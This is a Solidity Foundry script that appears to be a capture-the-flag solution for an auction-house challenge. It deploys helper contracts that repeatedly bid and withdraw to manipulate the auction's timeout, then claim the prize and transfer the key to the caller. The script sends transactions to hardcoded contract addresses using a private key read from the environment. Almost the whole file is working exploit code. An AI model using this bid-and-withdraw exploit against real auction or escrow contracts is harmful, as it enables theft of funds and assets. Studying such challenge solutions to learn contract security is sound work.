// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma abicoder v2;

import "../src/blockchain_false_bidding/AuctionHouse.sol";
import "../src/blockchain_false_bidding/Setup.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract exploiterContract {
  AuctionHouse level;
  constructor(AuctionHouse level_) {
    level = level_;
  } 
  
  function beTopBidder() external payable{
    address(level).call{value: msg.value}("");
  } 


  function withdrawFromAuction() external payable {
    level.withdrawFromAuction();
  } 

  function claim() external {
    level.claimPrize();
    level.keyTransfer(msg.sender);
  } 
  receive() payable external {  } 
} 

contract DistractAndDestroySolution is Script {
  AuctionHouse public level = AuctionHouse(payable(0x62C4ee569C504148ecBD65553fA0A5Bce05B08d6));
  Setup public level_setup = Setup(payable(0xd05e75aE85AE7607D76E2b9567aB7033Cd367fEb));

  function run() external { 
    vm.startBroadcast(vm.envUint("PRIVATE_KEY_FALSE_BIDDING"));
    console.log("timeout: ", uint256(level.timeout()));
    console.logUint(type(uint32).max);
    exploiterContract exploit;
    AuctionHouse.Bidder memory topBidder;
    for (uint i = 0; i < 15; i++) {
      topBidder = level.topBidder();
      exploit = new exploiterContract(level);
      exploit.beTopBidder{value: uint256(topBidder.bid) *2}();
      exploit.withdrawFromAuction();
    } 
    console.log("timeout: ", uint256(level.timeout()));
    topBidder = level.topBidder();
    exploit = new exploiterContract(level);
    exploit.beTopBidder{value: uint256(topBidder.bid) *2}();
    exploit.claim();

  }
} 
